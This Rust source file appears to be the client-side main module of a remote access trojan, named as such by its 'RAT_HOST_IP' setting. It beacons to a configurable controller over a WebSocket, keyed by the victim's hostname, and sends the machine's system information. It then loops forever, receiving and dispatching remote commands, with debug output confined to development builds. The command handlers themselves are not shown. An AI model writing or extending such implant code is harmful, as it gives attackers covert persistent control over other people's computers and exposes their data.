use futures_util::{SinkExt, StreamExt};
use std::str::FromStr;
use std::time::Duration;
use sysinfo::System;
use tokio_tungstenite::{connect_async, tungstenite::Message};

use crate::{
    router::route_message,
    utils::{is_port_valid, is_valid_ip, Connection},
};

mod handlers;
mod router;
mod utils;
#[tokio::main]
async fn main() {
    let host_ip = std::env::var("RAT_HOST_IP")
        .unwrap_or_else(|_| "127.0.0.1".to_string())
        .to_string();
    let host_port = std::env::var("RAT_HOST_PORT").unwrap_or_else(|_| "8080".to_string());

    if !is_valid_ip(&host_ip) || !is_port_valid(&host_port) {
        panic!();
    }

    let connection = Connection::from(
        host_ip.to_string(),
        i32::from_str(&host_port).expect("Invalid compile-time port"),
    );

    loop {
        dev_print!("Trying to connect to {}:{}", connection.ip, connection.port);

        if let Err(e) = run_connection_lifecycle(connection.clone()).await {
            dev_eprint!(
                "Error during connection lifecycle: {}. Retrying in 5s...",
                e
            );
        }

        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}

async fn run_connection_lifecycle(connection: Connection) -> anyhow::Result<()> {
    let client_id = System::host_name().unwrap_or_else(|| "unknown_client".to_string());

    let url_str = format!(
        "ws://{}:{}/ws/{}",
        connection.ip, connection.port, client_id
    );
    let url = url::Url::parse(&url_str)?;
    let (ws_stream, _response) = connect_async(url.as_str())
        .await
        .expect("Failed to connect");
    dev_print!("Successfully connected to {}", url_str);

    let (mut writer, mut reader) = ws_stream.split();

    let sysinfo = utils::SystemInformation::get().to_string();
    writer.send(Message::Text(sysinfo)).await?;
    dev_print!("System info sent.");

    while let Some(msg) = reader.next().await {
        let msg = msg?;
        if let Message::Text(text) = msg {
            dev_print!("Got command: {}", text);
            if let Err(e) = route_message(text, &mut writer).await {
                dev_eprint!("Error handling command: {}", e);
            }
        }
    }

    Ok(())
}
